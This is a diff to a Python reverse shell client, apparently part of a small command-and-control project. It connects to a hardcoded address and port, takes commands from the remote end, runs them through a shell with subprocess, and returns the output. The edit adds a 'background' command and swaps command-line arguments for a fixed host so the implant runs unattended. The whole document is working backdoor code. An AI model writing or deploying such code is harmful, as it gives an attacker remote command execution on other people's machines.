@@ -1,8 +1,6 @@
 import socket
 import subprocess
 import os
-import sys
-import threading
 
 def inbound():
     print('[+] Awaiting response..')
@@ -38,8 +36,10 @@ def session_handler():
                 outbound(cur_dir)
             except FileNotFoundError:
                 outbound('Invalid directory, Try again.')
-                continue   
-            else:
+                continue 
+        elif message == 'background':
+            pass  
+        else:
                 command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 output = command.stdout.read() + command.stderr.read()
                 outbound(output.decode())
@@ -47,11 +47,10 @@ def session_handler():
 if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        host_ip = sys.argv[1]
-        host_port = int(sys.argv[2])
+        host_ip = '192.168.106.1'
+        host_port = 2222
         session_handler()
     except IndexError:
         print('[-] Command line argument(s) missing, Please try again.')
     except Exception as e:
         print(e)
-
